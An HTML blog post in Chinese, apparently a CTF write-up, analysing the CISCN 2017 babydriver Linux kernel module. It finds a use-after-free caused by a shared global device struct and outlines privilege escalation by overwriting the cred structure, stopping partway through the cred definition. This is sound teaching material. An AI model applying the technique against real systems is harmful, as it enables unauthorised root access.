<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Kernel PWN UAF 的利用和调试 - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 -S -gdb tcp::1234 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。 光 attach 上去肯定不够，"><meta property="og:image" content><meta property="og:title" content="Kernel PWN UAF 的利用和调试"><meta property="og:description" content="进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 -S -gdb tcp::1234 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。 光 attach 上去肯定不够，"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/pwnreview/1408.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-19T15:45:00+00:00"><meta property="article:modified_time" content="2021-06-19T15:45:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Kernel PWN UAF 的利用和调试"><meta name=twitter:description content="进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 -S -gdb tcp::1234 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。 光 attach 上去肯定不够，"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>Kernel PWN UAF 的利用和调试</h1><div class=meta>Posted on Jun 19, 2021</div></div><section class=body><p>进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 <code>-S -gdb tcp::1234</code> 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。</p><p>光 attach 上去肯定不够，还需要能在恰当的地方打断点，以 CISCN 2017 babydrive 这题为例（题目可以在 <a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver>ctf-challenge</a> 上面下到）。</p><h3 id=分析>分析</h3><p>题目提供了一个压缩包，解压后可以获得三个文件</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ x babydriver.tar 
</span></span><span style=display:flex><span>boot.sh
</span></span><span style=display:flex><span>bzImage
</span></span><span style=display:flex><span>rootfs.cpio
</span></span></code></pre></div><p>典型的 kernel 题都会提供这三个文件，boot.sh 提供启动虚拟机的指令，bzImge 是内核镜像文件，rootfs.cpio 是文件系统的打包。首先解压出 rootfs.cpio 中的文件</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ file rootfs.cpio   
</span></span><span style=display:flex><span>rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span style=color:#40a070>4</span> 08:39:15 2017, max compression, from Unix, original size modulo 2^32 <span style=color:#40a070>2844672</span>
</span></span></code></pre></div><p>可以看出 rootfs.cpio 是经过 gzip 压缩过的，所以先重命名文件，并解压</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ mv rootfs.cpio rootfs.cpio.gz
</span></span><span style=display:flex><span>$ x rootfs.cpio.gz
</span></span></code></pre></div><p>就可以获得 .cpio 文件</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ file rootfs.cpio 
</span></span><span style=display:flex><span>rootfs.cpio: ASCII cpio archive <span style=color:#666>(</span>SVR4 with no CRC<span style=color:#666>)</span>
</span></span></code></pre></div><p>解压这个 rootfs.cpio 即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cpio -idmv &lt; rootfs.cpio
</span></span></code></pre></div><p>注意这样会把 rootfs.cpio 中的所有文件解压到当前目录下，为了防止当前目录过于杂乱，可以建一个文件夹专门存放解压出来的文件。</p><p>解压之后获得</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>bin  etc  home  init  lib  linuxrc  proc  sbin  sys  tmp  usr
</span></span></code></pre></div><p>这些文件。首先看一下 init 中写了什么</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ cat init  
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/bin/sh</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>mount -t proc none /proc
</span></span><span style=display:flex><span>mount -t sysfs none /sys
</span></span><span style=display:flex><span>mount -t devtmpfs devtmpfs /dev
</span></span><span style=display:flex><span>chown root:root flag
</span></span><span style=display:flex><span>chmod <span style=color:#40a070>400</span> flag
</span></span><span style=display:flex><span><span style=color:#007020>exec</span> 0&lt;/dev/console
</span></span><span style=display:flex><span><span style=color:#007020>exec</span> 1&gt;/dev/console
</span></span><span style=display:flex><span><span style=color:#007020>exec</span> 2&gt;/dev/console
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>insmod /lib/modules/4.4.72/babydriver.ko
</span></span><span style=display:flex><span>chmod <span style=color:#40a070>777</span> /dev/babydev
</span></span><span style=display:flex><span><span style=color:#007020>echo</span> -e <span style=color:#4070a0>&#34;\nBoot took </span><span style=color:#007020;font-weight:700>$(</span>cut -d<span style=color:#4070a0>&#39; &#39;</span> -f1 /proc/uptime<span style=color:#007020;font-weight:700>)</span><span style=color:#4070a0> seconds\n&#34;</span>
</span></span><span style=display:flex><span>setsid cttyhack setuidgid <span style=color:#40a070>1000</span> sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>umount /proc
</span></span><span style=display:flex><span>umount /sys
</span></span><span style=display:flex><span>poweroff -d <span style=color:#40a070>0</span>  -f
</span></span></code></pre></div><p>可见 init 脚本先把 flag 设成了 root 所有，且仅 root 可读。</p><p>同时还用 insmod 指令加载了一个模块，也就是 babydriver.ko 这个驱动文件。</p><p><em>关于 insmod</em></p><blockquote><p>Linux kernel 是一个单内核，虽然有速度较快等优点，但是却造成了功能拓展和维护较为困难，为了解决这个问题，Linux 引入了 LKM（动态可加载内核模块,Loadable Kernel Module，LKM）功能，可以在运行时插入、拔出模块，相关的命令有</p><ul><li>insmod 插入模块</li><li>rmmod 拔出模块</li><li>lsmod 列出已插入的模块</li></ul><p>这三个命令都是 shell 命令，可以直接在 shell 中执行。</p></blockquote><p>这里通过 insmod 插入了 babydriver.ko 这个驱动，基本上这就是漏洞点的位置了，我们从 <code>/lib/modules/4.4.72/babydriver.ko</code> 中取出文件，放到 IDA 里面分析。</p><p>可以看到有这些函数</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/2674611123.png></div><p>上面这些黑体的函数是驱动程序提供的外部接口，根据名字我们可以猜测出，对设备使用文件操作函数时有</p><ul><li>open => babyopen</li><li>read => babyread</li><li>write => babywrite</li><li>ioctl => babyioctl</li><li>free => babyrelease</li></ul><p>这些函数时在初试化的时候注册的，可以在 babydriver_init 函数中找到对应的操作验证</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#007020;font-weight:700>__cdecl</span> <span style=color:#06287e>babydriver_init</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> v0; <span style=color:#60a0b0;font-style:italic>// edx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>int</span> v1; <span style=color:#60a0b0;font-style:italic>// ebx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>class</span> <span>*</span><span style=color:#0e84b5;font-weight:700>v2</span>; <span style=color:#60a0b0;font-style:italic>// rax
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>__int64</span> v3; <span style=color:#60a0b0;font-style:italic>// rax
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( (<span style=color:#902000>int</span>)alloc_chrdev_region(<span style=color:#666>&amp;</span>babydev_no, <span style=color:#40a070>0LL</span>, <span style=color:#40a070>1LL</span>, <span style=color:#4070a0>&#34;babydev&#34;</span>) <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    cdev_init(<span style=color:#666>&amp;</span>cdev_0, <span style=color:#666>&amp;</span>fops);
</span></span><span style=display:flex><span>    cdev_0.owner <span style=color:#666>=</span> <span style=color:#666>&amp;</span>_this_module;
</span></span><span style=display:flex><span>    v1 <span style=color:#666>=</span> cdev_add(<span style=color:#666>&amp;</span>cdev_0, babydev_no, <span style=color:#40a070>1LL</span>);
</span></span></code></pre></div><p>这是函数开头的部分， fops 即为 file_operations 类型的结构体，查看其值</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 C0 <span style=color:#40a070>09</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>    fops            file_operations <span style=color:#666>&lt;</span>offset __this_module, <span style=color:#40a070>0</span>, offset babyread, \
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>                                            ; DATA <span style=color:#002070;font-weight:700>XREF</span>: <span style=color:#002070;font-weight:700>babydriver_init</span>:loc_1AA<span>↑</span>o
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 <span style=color:#40a070>30</span> <span style=color:#40a070>01</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>                                     offset babywrite, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, offset babyioctl, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>,\
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 F0 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>                                     offset babyopen, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, \
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>                                     <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span><span style=color:#666>&gt;</span>
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>    _data           ends
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>data</span>:<span style=color:#40a070>0000000000000</span><span style=color:#40a070>8</span>C0 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span><span style=color:#666>+</span>
</span></span></code></pre></div><p>对照 file_operations 的定义</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file_operations</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  module <span style=color:#666>*</span>owner;
</span></span><span style=display:flex><span>  loff_t (<span style=color:#666>*</span>llseek)(file <span style=color:#666>*</span>, loff_t, <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>read)(file <span style=color:#666>*</span>, <span style=color:#902000>char</span> <span style=color:#666>*</span>, size_t, loff_t <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>write)(file <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>, size_t, loff_t <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>read_iter)(kiocb <span style=color:#666>*</span>, iov_iter <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>write_iter)(kiocb <span style=color:#666>*</span>, iov_iter <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>iterate)(file <span style=color:#666>*</span>, dir_context <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#06287e>int</span> (<span style=color:#666>*</span>poll)(file <span style=color:#666>*</span>, poll_table_struct <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> (<span style=color:#666>*</span>unlocked_ioctl)(file <span style=color:#666>*</span>, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> (<span style=color:#666>*</span>compat_ioctl)(file <span style=color:#666>*</span>, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>mmap)(file <span style=color:#666>*</span>, vm_area_struct <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>open)(inode <span style=color:#666>*</span>, file <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>flush)(file <span style=color:#666>*</span>, fl_owner_t);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>release)(inode <span style=color:#666>*</span>, file <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>fsync)(file <span style=color:#666>*</span>, loff_t, loff_t, <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>aio_fsync)(kiocb <span style=color:#666>*</span>, <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>fasync)(<span style=color:#902000>int</span>, file <span style=color:#666>*</span>, <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>lock)(file <span style=color:#666>*</span>, <span style=color:#902000>int</span>, file_lock <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>sendpage)(file <span style=color:#666>*</span>, page <span style=color:#666>*</span>, <span style=color:#902000>int</span>, size_t, loff_t <span style=color:#666>*</span>, <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#06287e>__int64</span> (<span style=color:#666>*</span>get_unmapped_area)(file <span style=color:#666>*</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>check_flags)(<span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>flock)(file <span style=color:#666>*</span>, <span style=color:#902000>int</span>, file_lock <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>splice_write)(pipe_inode_info <span style=color:#666>*</span>, file <span style=color:#666>*</span>, loff_t <span style=color:#666>*</span>, size_t, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  ssize_t (<span style=color:#666>*</span>splice_read)(file <span style=color:#666>*</span>, loff_t <span style=color:#666>*</span>, pipe_inode_info <span style=color:#666>*</span>, size_t, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> (<span style=color:#666>*</span>setlease)(file <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>__int64</span>, file_lock <span style=color:#666>**</span>, <span style=color:#902000>void</span> <span style=color:#666>**</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> (<span style=color:#666>*</span>fallocate)(file <span style=color:#666>*</span>, <span style=color:#902000>int</span>, loff_t, loff_t);
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> (<span style=color:#666>*</span>show_fdinfo)(seq_file <span style=color:#666>*</span>, file <span style=color:#666>*</span>);
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>即可验证各函数的对应</p><p><em>这里使用面向对象的思维其实很好理解，注册时就是对类的虚表进行注册，各个函数就是对基类的虚函数的重写</em></p><p>我们对设备的调用一般可以通过 open 进行，那么看一下 babyopen 的实现</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>babyopen</span>(inode <span style=color:#666>*</span>inode, file <span style=color:#666>*</span>filp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  _fentry__(inode, filp);
</span></span><span style=display:flex><span>  babydev_struct.device_buf <span style=color:#666>=</span> (<span style=color:#902000>char</span> <span style=color:#666>*</span>)kmem_cache_alloc_trace(kmalloc_caches[<span style=color:#40a070>6</span>], <span style=color:#40a070>0x24000C0LL</span>, <span style=color:#40a070>64LL</span>);
</span></span><span style=display:flex><span>  babydev_struct.device_buf_len <span style=color:#666>=</span> <span style=color:#40a070>64LL</span>;
</span></span><span style=display:flex><span>  printk(<span style=color:#4070a0>&#34;device open</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>babydev_struct 的类型为 babydevice_t，其定义如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>babydevice_t</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>device_buf;
</span></span><span style=display:flex><span>  size_t device_buf_len;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>可以看到 open 一个 babydev 的时候会向内核申请一段长为 64 的空间，并设 device_buf_len 为 64。</p><p>通过 ioctl 我们可以使用设备自定义的指令对设备进行操作，此设备的函数实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>__int64</span> <span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>babyioctl</span>(file <span style=color:#666>*</span>filp, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> command, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  size_t v3; <span style=color:#60a0b0;font-style:italic>// rdx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  size_t v4; <span style=color:#60a0b0;font-style:italic>// rbx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>__int64</span> result; <span style=color:#60a0b0;font-style:italic>// rax
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  _fentry__(filp, command);
</span></span><span style=display:flex><span>  v4 <span style=color:#666>=</span> v3;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( command <span style=color:#666>==</span> <span style=color:#40a070>0x10001</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    kfree(babydev_struct.device_buf);
</span></span><span style=display:flex><span>    babydev_struct.device_buf <span style=color:#666>=</span> (<span style=color:#902000>char</span> <span style=color:#666>*</span>)_kmalloc(v4, <span style=color:#40a070>37748928LL</span>);
</span></span><span style=display:flex><span>    babydev_struct.device_buf_len <span style=color:#666>=</span> v4;
</span></span><span style=display:flex><span>    printk(<span style=color:#4070a0>&#34;alloc done</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    printk(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x013d</span><span style=color:#4070a0>efalut:arg is %ld</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, v3);
</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>22LL</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可见该设备定义了 0x10001 指令，其作用是 kfree 掉 babydev_struct.device_buf 这一段内存，然后再 kmalloc 一段我们指定长度的空间，并更新长度。</p><p>write 和 read 就是向 babydev_struct.device_buf 其中读写。</p><p>漏洞点就是 babydev_struct 这个变量是一个全局变量，所以多个设备共用一个结构体，就造成了严重的临界区错误，当我们申请两个设备后，一个设备释放另一个设备 kmalloc 出来的空间，另一个设备就可以对这段被释放的空间任意写，形成了 UAF。</p><h3 id=利用>利用</h3><p>我们现在的目标是进行提权来读出 flag。提权，可以通过修改 cred 结构体来实现。</p><p>kernel 对进程的权限记录是通过 cred 结构体来实现的，这个结构体中记录了程序的 uid 等 id，我们把这些 id 改成 0 就可以实现提权。此题的 kernel 版本为 4.4.72，cred 结构体的定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>cred</span> {
</span></span><span style=display:flex><span>	atomic_t	usage;
</span></span><span style=display:flex><span><span style=color:#007020>#ifdef CONFIG_DEBUG_CREDENTIALS
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	atomic_t	subscribers;	<span style=color:#60a0b0;font-style:italic>/* number of processes subscribed */</span>
</span></span><span style=display:flex><span>	<span style=color:#902000>void</span>		<span style=color:#666>*</span>put_addr;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span>	magic;
</span></span><span style=display:flex><span><span style=color:#007020>#define CRED_MAGIC	0x43736564
</span></span></span><span style=display:flex><span><span style=color:#007020>#define CRED_MAGIC_DEAD	0x44656144
</span></span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	kuid_t		uid;		<span style=color:#60a0b0;font-style:italic>/* real UID of the task */</span>
</span></span><span style=display:flex><span>	kgid_t		gid;		<span style=color:#60a0b0;font-style:italic>/* real GID of the task */</span>
</span></span><span style=display:flex><span>	kuid_t		suid;		<span style=color:#60a0b0;font-style:italic>/* saved UID of the task */</span>
</span></span><span style=display:flex><span>	kgid_t		sgid;		<span style=color:#60a0b0;font-style:italic>/* saved GID of the task */</span>
</span></span><span style=display:flex><span>	kuid_t		euid;		<span style=color:#60a0b0;font-style:italic>/* effective UID of the task */</span>
</span></span><span style=display:flex><span>	kgid_t		egid;		<span style=color:#60a0b0;font-style:italic>/* effective GID of the task */</span>
</span></span><span style=display:flex><span>	kuid_t		fsuid;		<span style=color:#60a0b0;font-style:italic>/* UID for VFS ops */</span>
</span></span><span style=display:flex><span>	kgid_t		fsgid;		<span style=color:#60a0b0;font-style:italic>/* GID for VFS ops */</span>
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span>	securebits;	<span style=color:#60a0b0;font-style:italic>/* SUID-less security management */</span>
</span></span><span style=display:flex><span>	kernel_cap_t	cap_inheritable; <span style=color:#60a0b0;font-style:italic>/* caps our children can inherit */</span>
</span></span><span style=display:flex><span>	kernel_cap_t	cap_permitted;	<span style=color:#60a0b0;font-style:italic>/* caps we&#39;re permitted */</span>
</span></span><span style=display:flex><span>	kernel_cap_t	cap_effective;	<span style=color:#60a0b0;font-style:italic>/* caps we can actually use */</span>
</span></span><span style=display:flex><span>	kernel_cap_t	cap_bset;	<span style=color:#60a0b0;font-style:italic>/* capability bounding set */</span>
</span></span><span style=display:flex><span>	kernel_cap_t	cap_ambient;	<span style=color:#60a0b0;font-style:italic>/* Ambient capability set */</span>
</span></span><span style=display:flex><span><span style=color:#007020>#ifdef CONFIG_KEYS
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span>	jit_keyring;	<span style=color:#60a0b0;font-style:italic>/* default keyring to attach requested
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>					 * keys to */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>key</span> __rcu <span style=color:#666>*</span>session_keyring; <span style=color:#60a0b0;font-style:italic>/* keyring inherited over fork */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>key</span>	<span style=color:#666>*</span>process_keyring; <span style=color:#60a0b0;font-style:italic>/* keyring private to this process */</span>
